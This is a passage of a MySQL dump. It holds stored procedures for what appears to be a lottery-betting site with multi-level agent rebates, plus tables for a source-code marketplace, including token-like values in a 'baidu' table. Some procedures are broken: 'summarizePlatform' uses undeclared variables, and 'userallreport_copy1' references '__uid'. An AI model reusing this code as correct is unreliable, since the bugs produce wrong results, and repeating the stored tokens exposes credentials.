				set parentAmount=_value-0;
			when 'rechargeCommission2' then
				set superParentAmount=_value-0;
			end case;
		until done end repeat;
	close cur;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `setCoin`(_coin float, _fcoin float, _uid int, _liqType int, _type int, _info varchar(255) character set utf8, _extfield0 int, _extfield1 varchar(255) character set utf8, _extfield2 varchar(255) character set utf8)
begin
	
	-- 当前时间
	DECLARE currentTime INT DEFAULT UNIX_TIMESTAMP();
	DECLARE _userCoin FLOAT;
	DECLARE _count INT  DEFAULT 0;
	-- select _coin, _fcoin, _liqType, _info;
	IF _coin IS NULL THEN
		SET _coin=0;
	END IF;
	IF _fcoin IS NULL THEN
		SET _fcoin=0;
	END IF;
	-- 更新用户表
	SELECT COUNT(1) INTO _count FROM ssc_coin_log WHERE  extfield0=_extfield0  AND info='中奖奖金'  AND `uid`=_uid;
	IF  _count<1 THEN
	UPDATE ssc_members SET coin = coin + _coin, fcoin = fcoin + _fcoin WHERE `uid` = _uid;
	SELECT coin INTO _userCoin FROM ssc_members WHERE `uid`=_uid;
	-- 添加资金流动日志
	INSERT INTO ssc_coin_log(coin, fcoin, userCoin, `uid`, actionTime, liqType, `type`, info, extfield0, extfield1, extfield2) VALUES(_coin, _fcoin, _userCoin, _uid, currentTime, _liqType, _type, _info, _extfield0, _extfield1, _extfield2);
	END IF;
	-- select coin, fcoin from ssc_members where `uid`=_uid;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `setDLFanDian`(amount float, INOUT _fanDian float, INOUT _parentId int, _type int, srcBetId int, srcUid int, INOUT srcUserName varchar(255))
begin
	
	declare p_parentId int;		-- 上级的上级
	declare p_fanDian float;	-- 上级返点
	declare p_username varchar(64);
	
	-- declare liqType int default 3;
	declare liqType int default 2;
	declare info varchar(255) character set utf8;
	
	declare done int default 0;
	declare cur cursor for
	select fanDian, uid, username from ssc_members where `uid`=_parentId;
	declare continue HANDLER for not found set done = 1;

	open cur;
		repeat
			fetch cur into p_fanDian, p_parentId, p_username;
		until done end repeat;
	close cur;

	if p_fanDian > _fanDian then
		set info=concat('下家[', cast(srcUserName as char), ']投注返点');
		call setCoin(amount * (p_fanDian - _fanDian) / 100, 0, _parentId, liqType, _type, info, srcBetId, srcUid, srcUserName);
	end if;
	
	set _parentId=p_parentId;
	set _fanDian=p_fanDian;
	set srcUserName=concat(p_username, '<=', srcUserName);
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `setGDFanDian`(amount float, INOUT _fanDian float, INOUT _gudongId int, _type int, srcBetId int, srcUid int, INOUT srcUserName varchar(255))
begin
	
	declare p_gudongId int;		-- 上级的上级
	declare p_fanDian float;	-- 上级返点
	declare p_username varchar(64);
	
	declare liqType int default 3;
	-- declare liqType int default 2;
	declare info varchar(255) character set utf8;
	
	declare done int default 0;
	declare cur cursor for
	select fanDian, uid, username from ssc_members where `uid`=_gudongId;
	declare continue HANDLER for not found set done = 1;

	open cur;
		repeat
			fetch cur into p_fanDian, p_gudongId, p_username;
		until done end repeat;
	close cur;

	if p_fanDian > _fanDian then
		set info=concat('下家[', cast(srcUserName as char), ']投注返点');
		call setCoin(amount * (p_fanDian - _fanDian) / 100, 0, _gudongId, liqType, _type, info, srcBetId, srcUid, srcUserName);
	end if;
	
	set _gudongId=p_gudongId;
	set _fanDian=p_fanDian;
	set srcUserName=concat(p_username, '<=', srcUserName);
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `setRechargeCom`(_coin float, _uid int, _rechargeId int, _serId int)
begin
	
	declare baseAmount float;
	declare parentAmount float;
	declare superParentAmount float;
	
	declare _parentId int;
	declare _surperParentId int;
	
	declare liqType int default 52;
	declare info varchar(255) character set utf8 default '充值佣金';
	
	declare done int default 0;
	declare cur cursor for
	select p.`uid`, p.parentId from ssc_members p, ssc_members u where p.`uid`=u.parentId and u.`uid`=_uid;
	declare continue HANDLER for not found set done=1;
	
	call readRechargeComSet(baseAmount, parentAmount, superParentAmount);
	
	open cur;
		repeat fetch cur into _parentId, _surperParentId;
			if not done then
				if _parentId then
					call setCoin(parentAmount, 0, _parentId, liqType, 0, info, _rechargeId, _serId, '');
				end if;
				
				if _surperParentId then
					call setCoin(superParentAmount, 0, _surperParentId, liqType, 0, info, _rechargeId, _serId, '');
				end if;
			end if;
		until done end repeat;
	close cur;
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `setZDLFanDian`(amount float, INOUT _fanDian float, INOUT _zparentId int, _type int, srcBetId int, srcUid int, INOUT srcUserName varchar(255))
begin
	
	declare p_zparentId int;		-- 上级的上级
	declare p_fanDian float;	-- 上级返点
	declare p_username varchar(64);
	
	declare liqType int default 3;
	-- declare liqType int default 2;
	declare info varchar(255) character set utf8;
	
	declare done int default 0;
	declare cur cursor for
	select fanDian, uid, username from ssc_members where `uid`=_zparentId;
	declare continue HANDLER for not found set done = 1;

	open cur;
		repeat
			fetch cur into p_fanDian, p_zparentId, p_username;
		until done end repeat;
	close cur;

	if p_fanDian > _fanDian then
		set info=concat('下家[', cast(srcUserName as char), ']投注返点');
		call setCoin(amount * (p_fanDian - _fanDian) / 100, 0, _zparentId, liqType, _type, info, srcBetId, srcUid, srcUserName);
	end if;
	
	set _zparentId=p_zparentId;
	set _fanDian=p_fanDian;
	set srcUserName=concat(p_username, '<=', srcUserName);
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `summarizeData`(_type int, _issue varchar(32))
begin

  declare _billCount int(5) DEFAULT 0;
  declare _pjed int(5) DEFAULT 0;
  declare _zjCount int(5) DEFAULT 0;
  declare _userCount int(5) DEFAULT 0;

  declare _betAmount double(18,4) DEFAULT 0.0000;
  declare _zjAmount double(18,4) DEFAULT 0.0000;
  declare _fanDianAmount double(18,4) DEFAULT 0.0000;
	
	select count(*) into _billCount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;
	select count(*) into _pjed from ssc_bets where isDelete=0 and type=_type and actionNo=_issue and lotteryNo!='';
	select count(*) into _zjCount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue and zjCount>0;
	select count(b.uid) into _userCount from (select uid from ssc_bets where isDelete=0 and type=_type and actionNo=_issue group by uid) b;

	select sum(amount) into _betAmount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;
	select sum(bonus) into _zjAmount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;
	select sum(fanDianAmount) into _fanDianAmount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;

	update ssc_data set billCount=_billCount, pjed=_pjed, zjCount=_zjCount, userCount=_userCount, betAmount=_betAmount, zjAmount=_zjAmount, fanDianAmount=_fanDianAmount where type=_type and number=_issue;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `summarizePlatform`(_date int(8))
begin

  declare _billCount int(5) DEFAULT 0;
  declare _pjed int(5) DEFAULT 0;
  declare _zjCount int(5) DEFAULT 0;
  declare _userCount int(5) DEFAULT 0;

  declare _betAmount double(18,4) DEFAULT 0.0000;
  declare _zjAmount double(18,4) DEFAULT 0.0000;
  declare _fanDianAmount double(18,4) DEFAULT 0.0000;
	
	select count(*) into _billCount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;
	select count(*) into _pjed from ssc_bets where isDelete=0 and type=_type and actionNo=_issue and lotteryNo!='';
	select count(*) into _zjCount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue and zjCount>0;
	select count(b.uid) into _userCount from (select uid from ssc_bets where isDelete=0 and type=_type and actionNo=_issue group by uid) b;

	select sum(amount) into _betAmount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;
	select sum(bonus) into _zjAmount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;
	select sum(fanDianAmount) into _fanDianAmount from ssc_bets where isDelete=0 and type=_type and actionNo=_issue;

	update ssc_data set billCount=_billCount, pjed=_pjed, zjCount=_zjCount, userCount=_userCount, betAmount=_betAmount, zjAmount=_zjAmount, fanDianAmount=_fanDianAmount where type=_type and number=_issue;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `summarizePlayed`(_date int(8), _type tinyint(3), _played int(11), _issue varchar(32))
begin

  declare _pri int(11) DEFAULT 0;
  
	declare _betCount int(5) DEFAULT 0;
  declare _betAmount double(15,4) DEFAULT 0.0000;
  declare _zjAmount double(15,4) DEFAULT 0.0000;
  declare _fanDianAmount double(15,4) DEFAULT 0.0000;
	
	select id into _pri from ssc_played_daily_count where date=_date and type=_type and played=_played;
	
	if _pri=0 or _pri is null THEN
		insert into ssc_played_daily_count (date, type, played) values(_date, _type, _played);
		select id into _pri from ssc_played_daily_count where date=_date and type=_type and played=_played;
	end if;

-- 统计有效方案数

	select count(*) into _betCount from ssc_bets where isDelete=0 and type=_type and playedId=_played and lotteryNo!='';
	
-- 统计总投注额
	select sum(money) into _betAmount from ssc_bets where isDelete=0 and type=_type and playedId=_played and lotteryNo!='';
-- 统计总中奖额
	select sum(bonus) into _zjAmount from ssc_bets where isDelete=0 and type=_type and playedId=_played and lotteryNo!='';
-- 统计总返点额
	select sum(fanDianAmount) into _fanDianAmount from ssc_bets where isDelete=0 and type=_type and playedId=_played and lotteryNo!='';
	
	
-- 对空值赋默认值，增强稳定性

	if _betCount is null THEN
		set _betCount = 0;
	end if;

	if _betAmount is null THEN
		set _betAmount = 0;
	end if;
	if _zjAmount is null THEN
		set _zjAmount = 0;
	end if;
	if _fanDianAmount is null THEN
		set _fanDianAmount = 0;
	end if;


-- 更新到数据库
	update ssc_played_daily_count set betCount=_betCount, betAmount=_betAmount, zjAmount=_zjAmount, fanDianAmount=_fanDianAmount where id=_pri;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `userallreport_copy`(_date int(8), _type tinyint(3),_uid int(10))
begin

  declare _pri int(11) DEFAULT 0;
  
	declare _betCount int(5) DEFAULT 0;
  declare _betAmount double(15,4) DEFAULT 0.0000;
  declare _zjAmount double(15,4) DEFAULT 0.0000;
  declare _fanDianAmount double(15,4) DEFAULT 0.0000;
	
	select id into _pri from ssc_count where date=_date and type=_type;
	
	if _pri=0 or _pri is null THEN
		insert into ssc_count (date, type) values(_date, _type);
		select id into _pri from ssc_count where date=_date and type=_type;
	end if;

-- 统计有效方案数

	select count(*) into _betCount from ssc_bets where isDelete=0 and type=_type and lotteryNo!='';
	
-- 统计总投注额
	select sum(money) into _betAmount from ssc_bets where isDelete=0 and type=_type and lotteryNo!='';
-- 统计总中奖额
	select sum(bonus) into _zjAmount from ssc_bets where isDelete=0 and type=_type and lotteryNo!='';
-- 统计总返点额
	select sum(fanDianAmount) into _fanDianAmount from ssc_bets where isDelete=0 and type=_type and lotteryNo!='';
	
	
-- 对空值赋默认值，增强稳定性

	if _betCount is null THEN
		set _betCount = 0;
	end if;

	if _betAmount is null THEN
		set _betAmount = 0;
	end if;
	if _zjAmount is null THEN
		set _zjAmount = 0;
	end if;
	if _fanDianAmount is null THEN
		set _fanDianAmount = 0;
	end if;


-- 更新到数据库
	update ssc_count set betCount=_betCount, betAmount=_betAmount, zjAmount=_zjAmount where id=_pri;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `userallreport_copy1`(_date int(8), _type tinyint(3),_uid int(10))
begin

	declare _pri int(11) DEFAULT 0; 
	declare _betCount int(5) DEFAULT 0;
	declare _betAmount double(15,4) DEFAULT 0.0000;
	declare _zjAmount double(15,4) DEFAULT 0.0000;
	declare _rebateMoney double(15,4) DEFAULT 0.0000;
	declare _username VARCHAR(16) DEFAULT null;
	declare _gudongId int(10) DEFAULT 0; 
	declare _zparentId int(10) DEFAULT 0; 
	declare _parentId int(10) DEFAULT 0; 

	if _uid then

	select id into _pri from ssc_count where date=_date and uid=__uid and type=_type;
	
	if _pri=0 or _pri is null THEN
		insert into ssc_count (date, uid) values(_date, _uid);
		select id into _pri from ssc_count where date=_date and uid=_uid and type=_type;
	end if;

-- 统计有效方案数

	select count(*) into _betCount from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and type=_type;
	
-- 统计总投注额
	select sum(money) into _betAmount from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and type=_type;
-- 统计总中奖额
	select sum(bonus) into _zjAmount from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and type=_type;
-- 统计总退水额
	select sum(rebateMoney) into _rebateMoney from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and type=_type;
	-- 查询用户信息
	select uid into _uid from ssc_members where isDelete=0 and uid=_uid;
	select username into _username from ssc_members where isDelete=0 and uid=_uid;
	select gudongId into _gudongId from ssc_members where isDelete=0 and uid=_uid;
	select zparentId into _zparentId from ssc_members where isDelete=0 and uid=_uid;	
	select parentId into _parentId from ssc_members where isDelete=0 and uid=_uid;
-- 对空值赋默认值，增强稳定性

	if _betCount is null THEN
		set _betCount = 0;
	end if;

	if _betAmount is null THEN
		set _betAmount = 0;
	end if;
	if _zjAmount is null THEN
		set _zjAmount = 0;
	end if;
	if _rebateMoney is null THEN
		set _rebateMoney = 0;
	end if;


-- 更新到数据库
	update ssc_count set betCount=_betCount, betAmount=_betAmount, zjAmount=_zjAmount, rebateMoney=_rebateMoney, username=_username, uid=_uid, gudongId=_gudongId, zparentId=_zparentId, parentId=_parentId where id=_pri;
	end if;

end$$

DELIMITER ;

-- --------------------------------------------------------

--
-- 表的结构 `360url`
--

CREATE TABLE IF NOT EXISTS `360url` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `titles` varchar(500) DEFAULT NULL,
  `urls` varchar(500) DEFAULT NULL,
  `datetimes` datetime DEFAULT NULL,
  `status` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=502 ;

-- --------------------------------------------------------

--
-- 表的结构 `baidu`
--

CREATE TABLE IF NOT EXISTS `baidu` (
  `id` int(11) NOT NULL,
  `urls` text,
  `token` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=latin1 ROW_FORMAT=DYNAMIC;

--
-- 转存表中的数据 `baidu`
--

INSERT INTO `baidu` (`id`, `urls`, `token`) VALUES
(0, 'www.163aas.com', '49krgLbkHLcwJJnV'),
(1, '1608317590898109', 'yeVCzzbiU7cycCfW'),
(2, '', '');

-- --------------------------------------------------------

--
-- 表的结构 `baiduurl`
--

CREATE TABLE IF NOT EXISTS `baiduurl` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `titles` varchar(500) DEFAULT NULL,
  `urls` varchar(500) DEFAULT NULL,
  `datetimes` datetime DEFAULT NULL,
  `status` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `baiduurl`
--

INSERT INTO `baiduurl` (`id`, `titles`, `urls`, `datetimes`, `status`) VALUES
(1, '企业发卡网源码发卡平台源码全开源运营版', '<?=weburl?>/product/view256.html', '2019-10-03 10:52:40', '推送成功'),
(2, '易经风水网站模板 八字算命 测字易经协会培训 带移动端 高端大气', 'http://127.0.0.2/./product/view255.html', '2019-10-03 10:55:22', '推送成功'),
(3, '织梦自适应瀑布流图片站模板', 'http://127.0.0.2/product/view252.html', '2019-10-03 11:17:38', '推送失败');

-- --------------------------------------------------------

--
-- 表的结构 `collection`
--

CREATE TABLE IF NOT EXISTS `collection` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) DEFAULT NULL,
  `date` date DEFAULT NULL,
  `user` varchar(255) DEFAULT NULL,
  `addtime` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `collection`
--

INSERT INTO `collection` (`id`, `uid`, `date`, `user`, `addtime`) VALUES
(1, 15, '2020-08-31', '源码商城', '2019-03-31 20:19:58'),
(2, 14, '2019-08-31', '885617199', '2019-06-09 23:21:19');

-- --------------------------------------------------------

--
-- 表的结构 `collectionprice`
--

CREATE TABLE IF NOT EXISTS `collectionprice` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `1` decimal(10,2) DEFAULT NULL,
  `3` decimal(10,2) DEFAULT NULL,
  `6` decimal(10,2) DEFAULT NULL,
  `12` decimal(10,2) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 ROW_FORMAT=FIXED AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `collectionprice`
--

INSERT INTO `collectionprice` (`id`, `1`, `3`, `6`, `12`) VALUES
(1, '10.00', '28.00', '48.00', '88.00');

-- --------------------------------------------------------

--
-- 表的结构 `xiongzhangurl`
--

CREATE TABLE IF NOT EXISTS `xiongzhangurl` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `titles` varchar(500) DEFAULT NULL,
  `urls` varchar(500) DEFAULT NULL,
  `datetimes` datetime DEFAULT NULL,
  `status` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `xiongzhangurl`
--

INSERT INTO `xiongzhangurl` (`id`, `titles`, `urls`, `datetimes`, `status`) VALUES
(1, '企业发卡网源码发卡平台源码全开源运营版', '<?=weburl?>/product/view256.html', '2019-10-03 10:52:41', '推送成功'),
(2, '易经风水网站模板 八字算命 测字易经协会培训 带移动端 高端大气', 'http://127.0.0.2/.product/view255.html', '2019-10-03 10:55:22', '推送成功'),
(3, '织梦自适应瀑布流图片站模板', 'http://127.0.0.2/product/view252.html', '2019-10-03 11:17:38', '推送失败');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_ad`
--

CREATE TABLE IF NOT EXISTS `yjcode_ad` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `type1` char(30) DEFAULT NULL,
  `jpggif` char(20) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `adbh` char(30) DEFAULT NULL,
  `txt` text,
  `sj` datetime DEFAULT NULL,
  `aurl` text,
  `sm` varchar(250) DEFAULT NULL,
  `xh` int(11) DEFAULT NULL,
  `aw` int(11) DEFAULT NULL,
  `ah` int(11) DEFAULT NULL,
  `dqsj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=333 ;

--
-- 转存表中的数据 `yjcode_ad`
--

INSERT INTO `yjcode_ad` (`id`, `bh`, `type1`, `jpggif`, `tit`, `adbh`, `txt`, `sj`, `aurl`, `sm`, `xh`, `aw`, `ah`, `dqsj`, `zt`, `money1`, `userid`) VALUES
(5, '1414134080ad4', '图片', 'gif', '底部广告', 'ADI01', '', '2014-10-24 15:01:42', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(8, '1414141966ad63', '图片', 'jpg', '会员中心右侧广告', 'ADU01', '', '2014-10-24 17:12:46', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(9, '1414141969ad100', '图片', 'jpg', '会员中心右侧广告', 'ADU01', '', '2014-10-24 17:12:49', '/help/view8.html', NULL, 2, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(10, '1414141971ad11', '图片', 'jpg', '会员中心右侧广告', 'ADU01', '', '2014-10-24 17:12:51', '/help/view8.html', NULL, 3, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(11, '1415160861ad38', '代码', 'gif', '商品详情左侧广告', 'ADP01', '<a href="http://www.west.cn?ReferenceID=1239914" target=_blank><img src="http://www.west.cn/vcp/vcp_img/free6/C/180x250_C.jpg" border=0></a>', '2014-11-05 12:14:21', '', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(12, '1415976888ad14', '图片', 'jpg', '商品列表左上广告', 'ADP02', '', '2014-11-14 22:54:48', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(14, '1416020955ad88', '图片', 'jpg', '登录框左侧广告', 'ADO01', '', '2014-11-15 11:09:15', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(15, '1416024835ad70', '图片', 'jpg', '商家列表页左上广告', 'ADS01', '', '2014-11-15 12:13:55', 'https://s.click.taobao.com/KyV0PZw', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(16, '1416039894ad11', '文字', '', '实物/交易', 'ADI02', '', '2015-04-21 01:13:57', '/product/search_j39v.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(17, '1416115010ad94', '图片', 'jpg', '双十一来了', 'ADI04', '', '2014-11-16 13:16:50', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(18, '1416115023ad76', '图片', 'jpg', '华为', 'ADI04', '', '2014-11-16 13:17:03', '/help/view8.html', NULL, 2, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(19, '1416208251ad54', '图片', 'jpg', '计算机/互联网', 'ADN01', '', '2014-11-17 15:10:51', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(20, '1416210641ad45', '图片', 'jpg', '资讯正文页右侧广告', 'ADNV01', '', '2014-11-17 15:50:41', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(21, '1416210731ad4', '图片', 'jpg', '资讯详情页最新发布上方横幅', 'ADNV02', '', '2014-11-17 15:52:11', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(22, '1416211155ad4', '文字', '', '站长运营版', 'ADI02', '', '2015-04-20 23:02:12', 'http://www.0598128.com/', NULL, 7, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(23, '1416211172ad39', '文字', '', '商家风采', 'ADI02', '', '2015-04-20 23:02:29', '/shop/', NULL, 8, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(24, '1416212227ad5', '图片', 'jpg', '资讯列表页右侧广告', 'ADNV04', '', '2014-11-17 16:17:07', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(25, '1416230127ad47', '图片', 'jpg', 'Pinterest: 下一代社交巨头', 'ADN00', '', '2014-11-17 21:15:27', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(26, '1416230204ad53', '图片', 'jpg', '饿了么VS美团外卖：来自一个大学生的“硬碰硬”报告', 'ADN00', '', '2014-11-17 21:16:44', '/help/view8.html', NULL, 2, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(27, '1416235302ad45', '图片', 'jpg', '资讯首页切换下方横幅', 'ADN02', '', '2014-11-17 22:41:42', '/help/view8.html', NULL, 1, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(29, '1416391161ad64', '文字', '', '源码/交易', 'ADI02', '', '2015-04-21 01:13:03', '/product/search_j37v.html', NULL, 0, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(30, '1429542206ad89', '文字', '', '任务大厅', 'ADI02', '', '2015-04-20 23:03:26', '/task/', NULL, 9, 0, 0, '2049-12-12 12:12:12', 0, NULL, NULL),
(34, '1488458132ad92', '图片', 'jpg', '', 'ADMT01', '', '2017-03-02 20:35:32', '', NULL, 1, 0, 0, '2054-03-02 20:37:10', 0, NULL, NULL),
(35, '1488458257ad65', '图片', 'png', '', 'ADMT01', '', '2017-03-02 20:37:37', '', NULL, 2, 0, 0, '2045-03-02 20:37:56', 0, NULL, NULL),
(36, '1488458316ad66', '代码', 'jpg', '1', 'ADMT02', '<MARQUEE scrollAmount=3 behavior=alternate>在后台广告管理，输入代码，修改文字，文字来回滚动</MARQUEE>', '2017-03-02 20:38:36', '', NULL, 1, 0, 0, '2058-03-02 20:38:45', 0, NULL, NULL),
(37, '1488458359ad61', '图片', 'jpg', '1', 'ADMT03', '', '2017-03-02 20:39:19', '', NULL, 1, 0, 0, '2047-03-02 20:39:21', 0, NULL, NULL),
(52, '1488474890ad97', '图片', 'gif', '', 'ADTASK01', '', '2017-03-03 01:14:50', '/task/taskadd.php', NULL, 1, 0, 0, '2033-03-03 01:14:52', 0, NULL, NULL),
(54, '1488475899ad48', '图片', 'png', '', 'shang_01', '', '2017-03-03 01:31:39', '', NULL, 1, 0, 0, '2042-03-03 01:31:48', 0, NULL, NULL),
(55, '1488516206ad64', '图片', 'gif', '/user/productlx.php', 'shang_03', '', '2017-03-03 12:43:26', '', NULL, 1, 0, 0, '2038-03-03 12:44:09', 0, NULL, NULL),
(61, '1488521581ad96', '图片', 'jpg', '首页切换图片', 'jiandan_01', '', '2017-03-03 14:13:01', '', NULL, 1, 0, 0, '2042-03-03 14:13:08', 0, NULL, NULL),
(62, '1488521663ad6', '图片', 'jpg', '首页切换图片', 'jiandan_01', '', '2017-03-03 14:14:23', '', NULL, 2, 0, 0, '2036-03-03 14:14:23', 0, NULL, NULL),
(63, '1488521690ad23', '图片', 'jpg', '首页切换图片', 'jiandan_01', '', '2017-03-03 14:14:50', '', NULL, 3, 0, 0, '2042-03-03 14:15:01', 0, NULL, NULL),
(64, '1488521714ad69', '图片', 'jpg', '首页切换图片', 'jiandan_01', '', '2017-03-03 14:15:14', '', NULL, 4, 0, 0, '2043-03-03 14:15:22', 0, NULL, NULL),
(65, '1488521736ad89', '图片', 'jpg', '首页切换图片', 'jiandan_01', '', '2017-03-03 14:15:36', '', NULL, 5, 0, 0, '2042-03-03 14:15:40', 0, NULL, NULL),
(67, '1488523919ad62', '图片', 'png', '', 'shang_01', '', '2017-03-03 14:51:59', '', NULL, 2, 0, 0, '2034-03-03 14:51:58', 0, NULL, NULL),
(68, '1488524080ad82', '图片', 'jpg', '', 'ADSHOP01', '', '2017-03-03 14:54:40', '', NULL, 1, 0, 0, '2029-03-03 14:54:39', 0, NULL, NULL),
(69, '1488524532ad60', '图片', 'gif', '', 'ADI05', '', '2017-03-03 15:02:12', '', NULL, 1, 0, 0, '2021-03-03 15:02:29', 0, NULL, NULL),
(71, '1488540609ad14', '图片', 'jpg', '虚位以待', 'ADN02', '', '2017-03-03 19:30:09', '', NULL, 2, 0, 0, '2042-03-03 19:30:10', 0, NULL, NULL),
(72, '1489646047ad61', '图片', 'jpg', '', 'menhu_01', '', '2017-03-16 14:34:07', '', NULL, 1, 0, 0, '2029-03-16 14:34:07', 0, NULL, NULL),
(73, '1489646074ad99', '图片', 'jpg', '', 'menhu_01', '', '2017-03-16 14:34:34', '', NULL, 2, 0, 0, '2030-03-16 14:34:40', 0, NULL, NULL),
(74, '1490601840ad59', '图片', 'jpg', '首页商品分类导航下方自由广告', 'mi_01', '', '2017-03-27 16:04:00', '', NULL, 1, 0, 0, '2045-03-27 16:04:06', 0, NULL, NULL),
(75, '1490601912ad20', '图片', 'jpg', '', 'mi_02', '', '2017-03-27 16:05:12', '', NULL, 1, 0, 0, '2046-03-27 16:05:16', 0, NULL, NULL),
(76, '1490601927ad62', '图片', 'jpg', '', 'mi_02', '', '2017-03-27 16:05:27', '', NULL, 2, 0, 0, '2045-03-27 16:05:31', 0, NULL, NULL),
(77, '1490602005ad21', '图片', 'jpg', '最新活动299元', 'mi_03', '', '2017-03-27 16:06:45', '', NULL, 1, 0, 0, '2046-03-27 16:06:50', 0, NULL, NULL),
(78, '1490602050ad36', '图片', 'png', 'O2O读物', 'mi_04', '', '2017-03-27 16:07:30', '', NULL, 1, 0, 0, '2045-03-27 16:07:36', 0, NULL, NULL),
(79, '1490602077ad86', '图片', 'jpg', '红米NOTE4', 'mi_04', '', '2017-03-27 16:07:57', '', NULL, 2, 0, 0, '2046-03-27 16:08:04', 0, NULL, NULL),
(80, '1490602124ad99', '图片', 'png', '小米5S超感光相机', 'mi_04', '', '2017-03-27 16:08:44', '', NULL, 3, 0, 0, '2045-03-27 16:08:52', 0, NULL, NULL),
(81, '1490602566ad63', '图片', 'jpg', '第一张', 'mi_05', '', '2017-03-27 16:16:06', '', NULL, 1, 0, 0, '2021-03-27 16:16:10', 0, NULL, NULL),
(82, '1490602585ad46', '图片', 'jpg', '第二张', 'mi_05', '', '2017-03-27 16:16:25', '', NULL, 2, 0, 0, '2026-03-27 16:16:44', 0, NULL, NULL),
(83, '1490602660ad87', '图片', 'jpg', '第一张', 'mi_06', '', '2017-03-27 16:17:40', '', NULL, 1, 0, 0, '2030-03-27 16:17:43', 0, NULL, NULL),
(84, '1490602687ad52', '图片', 'jpg', '第二张', 'mi_06', '', '2017-03-27 16:18:07', '', NULL, 2, 0, 0, '2026-03-27 16:18:12', 0, NULL, NULL),
(86, '1490782156ad44', '图片', 'jpg', '', 'ADO02', '', '2017-03-29 18:09:16', '', NULL, 1, 0, 0, '2046-03-29 18:09:28', 0, NULL, NULL),
(87, '1491285896ad64', '图片', 'jpg', '第1张', 'ke_06', '', '2017-04-04 14:04:56', '', NULL, 1, 0, 0, '2046-04-04 14:05:04', 0, NULL, NULL),
(88, '1491285923ad25', '图片', 'jpg', '第2张', 'ke_06', '', '2017-04-04 14:05:23', '', NULL, 2, 0, 0, '2046-04-04 14:05:23', 0, NULL, NULL),
